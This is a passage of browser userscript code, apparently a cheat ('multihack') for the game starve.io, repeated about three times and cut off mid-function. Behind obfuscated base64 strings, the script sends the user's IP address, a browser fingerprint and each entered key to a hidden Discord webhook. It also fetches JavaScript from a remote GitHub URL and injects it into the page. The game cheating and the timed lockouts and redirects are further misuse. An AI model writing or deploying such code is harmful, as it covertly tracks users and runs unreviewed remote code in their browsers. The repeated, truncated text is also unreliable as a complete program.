                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
